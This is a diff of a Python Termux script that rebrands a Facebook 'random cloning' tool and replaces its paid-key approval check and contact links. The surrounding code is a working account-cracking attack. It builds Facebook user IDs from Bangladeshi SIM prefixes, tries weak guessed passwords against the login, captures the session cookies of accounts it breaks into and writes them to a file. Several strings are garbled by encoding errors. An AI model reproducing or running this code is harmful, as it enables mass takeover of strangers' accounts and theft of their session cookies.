@@ -121,62 +121,76 @@ def jalan(z):
         time.sleep(0.01)
         
         
-def approval():
-  os.system('clear')
-  banner()
-  uuid = str(os.geteuid()) + str(os.getlogin())
-  id = "4h".join(uuid)
-  try:
-    httpCaht = requests.get('https://github.com/XESAN-VAU/RANDOM-FIRE-APPROVAL/blob/main/FIRE.txt').text
-    if id in httpCaht:
-      print("\33[1;32mYour Token is Successfully Approved")
-      print('\033[1;93mYour Token is Successfully Approved ')
-      psb('\033[1;92m[\033[92;1m•\033[1;97m]\033[1;97mYOUR KEY DONE PAID USER ADMIN PERMISSION BY ALEN XESAN ')
-      msg = str(os.geteuid())
-      time.sleep(0.03)
-      print()
-      pass
+def main_apv():
+
+    imt="110Y=="
+
+    ak="RIFAT_100RS"
+
+    os.system('clear')
+
+    print(logo)
+
+    try:
+
+        key1=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'r').read()
+    except IOError:
+        os.system("clear")
+        print(logo)
+        print ("ï¿½ï¿½")
+        print ("YOUR TOKEN IS NOT APROVAL")     
+        print ("         THIS IS YOUR TOKEN")
+        print ("ï¿½ï¿½")
+        print ("")
+        myid=uuid.uuid4().hex[:10].upper()
+        print ("          YOUR KEY : "+ak+myid+imt)
+        print ("ï¿½ï¿½")
+        kok=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'w')
+        kok.write(myid+imt)
+        kok.close()
+        print ("")
+        print ("")
+        print ("  Copy Key And Sent Me WhatsApp Approvel Your Key ")
+        print ("ï¿½ï¿½")
+        time.sleep(3.5)
+        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt
+
+        os.system('am start https://wa.me/+8801858029266?text=' + tks)
+
+        
+
+    r1=requests.get("https://github.com/Asrafxd17/RANDOM/blob/main/free.txt").text
+
+    if key1 in r1:
+
+        R()
+
     else:
-      print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
-      print("\033[1;97m[\033[92;1m●\033[1;97m] Note : You Are  Not Premium User...! ")         
-      print("\033[1;97m[\033[92;1m●\033[1;97m] \033[1;97mYour Key \033[38;5;196mNot Registered ")                             
-      print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
-      print("\033[1;97m[\033[92;1m●\033[1;97m] Tools... :\033[92;1m Facebook Cloning ")
-      print('\033[1;97m[\033[92;1m●\033[1;97m] Status   :\033[38;5;196m Trail')
-      print("\033[1;97m[\033[92;1m●\033[1;97m] Your Key :\033[92;1m "+id)
-      print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
-      print('\033[1;97m[\033[92;1m●\033[1;97m]\x1b[97m\033[37;41m Note:If You Are Free User Don,t Come Inbox\033[0;m \033[1;97m[\033[92;1m●\033[1;97m]')
-      print('\033[1;97m[\033[92;1m●\033[1;97m] 7-Days Price :\033[92;1m 300 \033[1;97m[\033[92;1m●\033[1;97m] 15-Days Price :\033[92;1m 500 \033[1;97m[\033[92;1m●\033[1;97m]')
-      print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
-      print('\033[1;97m[\033[92;1m●\033[1;97m] Fb Cloning Menu')
-      print('\033[1;97m[\033[92;1m●\033[1;97m] File Create Menu')
-      print('\033[1;97m[\033[92;1m●\033[1;97m] Join Fb Group')
-      print('\033[1;97m[\033[92;1m●\033[1;97m] Exit Menu')                               
-      input('\033[1;97m[\033[92;1mENTER\033[1;97m] Upgrade Tool (\033[92;1mPremium\033[1;97m)  ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://m.me/ALEN.OKH?text='+tks),approval()
-      time.sleep(1)
-      approval()
-  except:
-    sys.exit()
-approval()
+
         os.system("clear")
   
 logo=(""" 
-\033[1;97m╔════════════════════════════════╗   
-\033[1;97m║ \033[1;95m╔═╗╦  ╔═╗╔╗╔  ═╗ ╦╔═╗╔═╗╔═╗╔╗╔\033[1;97m ║
-\033[1;97m║ \033[1;92m╠═╣║  ║╣ ║║║  ╔╩╦╝║╣ ╚═╗╠═╣║║║ \033[1;97m║
-\033[1;97m║ \033[1;93m╩ ╩╩═╝╚═╝╝╚╝  ╩ ╚═╚═╝╚═╝╩ ╩╝╚╝ \033[1;97m║
-\033[1;97m╚════════════════════════════════╝
-\033[1;97m╔══════════════════════════════════════╗   
-\033[1;97m║\033[1;95m  Owner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93mALEN XESAN \033[1;90m<\033[1;92m•\033[1;90m> \033[1;95mversion 1.0\033[1;97m║
-\033[1;97m╚══════════════════════════════════════╝
-\033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┐
-\033[1;37m│ ❲\033[1;92m★\033[1;97m❳ AUTHOR   : \033[1;92mALEN XESAN             \033[1;97m│ 
-\033[1;37m│ ❲\033[1;92m★\033[1;97m❳ FACEBOOK : \033[1;92mALEN🙂😈               \033[1;97m│
-\033[1;37m│ ❲\033[1;92m★\033[1;97m❳ WHATSAPP : \033[1;92m+88015*******4         \033[1;97m│
-\033[1;37m│ ❲\033[1;92m★\033[1;97m❳ TOOLS    : \033[1;32mGAME ID CLONER  \033[1;37m       │
-\033[1;37m│ ❲\033[1;92m★\033[1;97m❳ VERSION  : \033[1;35m 8\033[1;35mK \033[1;32mPREMIUM  \033[1;37m          │
-\033[1;93m└━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┘""")
+            _____ _____            ______  __   _______  
+     /\    / ____|  __ \     /\   |  ____| \ \ / /  __ \ 
+    /  \  | (___ | |__) |   /  \  | |__     \ V /| |  | |
+   / /\ \  \___ \|  _  /   / /\ \ |  __|     > < | |  | |
+  / ____ \ ____) | | \ \  / ____ \| |       / . \| |__| |
+ /_/    \_\_____/|_|  \_\/_/    \_\_|      /_/ \_\_____/ 
+                                                                                                                              
+\33[1;92mâ•”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•—               
+â•‘  \x1b[97m\033[37;41m Welcome to my ASRAF Tools                          \033[0;m  â•‘
+\33[1;92mâ•šâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•                      
+\33[1;92mâ•”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•—               
+â•‘  \x1b[97m\033[37;41m  FREE BANGLADESHI RANDOM CLONING V1 \033[0;m    â•‘
+\33[1;92mâ•šâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•            
+\33[1;92mâ•”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•—
+\33[1;92mâ•‘âž£\033[1;91m DEVOLPER   :          ASRAF \33[1;92mâ•‘               
+\33[1;92mâ•‘âž£ FACEBOOK   :          ASRAF AHMED \33[1;92mâ•‘                 
+\33[1;92mâ•‘âž£\033[1;93m WHATSAPP   :          01858029266        \33[1;92m â•‘
+\33[1;92mâ•‘âž£\033[1;34m GITHUB     :          Asrafxd17         \33[1;92m â•‘          
+\33[1;92mâ•‘âž£\033[1;35m TOOLS      :          BD RANDOM CRACKING \33[1;92m â•‘                 
+\33[1;92mâ•šâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•
+""")
 def cek_apk(session,coki):
 	w=session.get("https://d.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
 	sop = BeautifulSoup(w,"html.parser")
@@ -202,11 +216,11 @@ def cek_apk(session,coki):
 def Main():
 	os.system('clear')
 	print(logo)
-	print("[\033[1;93mA\33[1;92m] START RANDOM CLONING")
-	print("[\033[1;93mB\33[1;92m] JOIN MY FACEBOOK GROUP")
-	print("[\033[1;93mC\33[1;92m] CONTACT ME ON MESSENGER")
-	print("[\033[1;93mD\33[1;92m] MY FACEBOOK")
-	print('[\033[1;93mE\33[1;92m] EXIT PROGRAMMING')
+	print("[\033[1;37m01\33[1;92m][\033[1;93mA\33[1;92m] START RANDOM CLONING")
+	print("[\033[1;37m02\33[1;92m][\033[1;93mB\33[1;92m] JOIN MY FACEBOOK GROUP")
+	print("[\033[1;37m03\33[1;92m][\033[1;93mC\33[1;92m] CONTACT ME ON FB")
+	print("[\033[1;37m04\33[1;92m][\033[1;93mD\33[1;92m] MY WHATSAPP")
+	print('[\033[1;37m00\33[1;92m][\033[1;93mE\33[1;92m] EXIT PROGRAMMING')
 	print(54*'â”')
 	opt = input('Choose option >>> ')
 	if opt in ["A","1"]:
@@ -214,10 +228,10 @@ def Main():
 	if opt in ["B","2"]:
 		admin()
 	if opt in ["C","3"]:
-		os.system('xdg-open https://www.facebook.com/groups/647831005946417');time.sleep(1)
+		os.system('xdg-open https://facebook.com/groups/1234985540516131/');time.sleep(1)
 		fb()
 	if opt in ["D","4"]:
-		os.system('xdg-open https://m.me/ALEN.OKH');time.sleep(1)
+		os.system('xdg-open https://wa.me/+8801858029266');time.sleep(1)
 		group()
 	if opt in ["0","0"]:
 		exit()
@@ -229,15 +243,15 @@ def admin():
 	os.system('clear')
 	print(logo)
 	print(50*'_')
-	print(' [1] Contract MESSENGER ')
+	print(' [1] Contract WhatsApp ')
 	print(' [2] JOIN MY FACEBOOK GROUP')
 	print(' [0] Back to Main menu')
 	bal = input('Choose option >>> ')
 	if bal =='1':
-		os.system('xdg-open https://m.me/ALWN.OKH');time.sleep(1)
+		os.system('xdg-open https://wa.me/+8801858029266');time.sleep(1)
 		admin()
 	if bal =='2':
-		os.system('xdg-open https://www.facebook.com/groups/647831005946417');time.sleep(1)
+		os.system('xdg-open https://facebook.com/groups/1234985540516131/');time.sleep(1)
 		admin()
 	if bal =='0':
 		Main()
@@ -263,15 +277,15 @@ def ASRAF():
 		print('â”â”[â€¢] COUNTRY    : Bangladesh')
 		print('â”£â”[â€¢] TOTAL ID   :  '+tl)
 		print(f'â”£â”[â€¢] SIM CODE   : \033[1;92m {kode} ')
-		print('â”—â”[â€¢] START BD UID MIXED CRACKING... ')
+		print('â”—â”[â€¢] START BD UID MIXT CRACKING... ')
 		print(50*'â”')
 		for guru in user:
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you']
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
-	print(' [+] Crack process has been completed')
-	print(' [+] Ids saved in ok.txt,cp.txt')
+	print(' [ðŸ’‰] Crack process has been completed')
+	print(' [ðŸ’‰] Ids saved in ok.txt,cp.txt')
 	print(50*'_')
 	exit()
 
@@ -283,7 +297,7 @@ def b(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93mALEN\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mASRAF\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -318,10 +332,10 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [ALEN] '+cid+' | '+ps+'\33[0;92m')
-                print(f'\r\033[1;92m=[ALEN]=COOKIE : '+coki)
+                print(f'\r\33[1;92m [ASRAF-ðŸ’š] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\033[1;92m=[ðŸ’™]=COOKIE : '+coki)
                 oks.append(cid)
-                open('/sdcard/ALEN-OKðŸ’¥.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/ASRAF-OKðŸ’¥.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
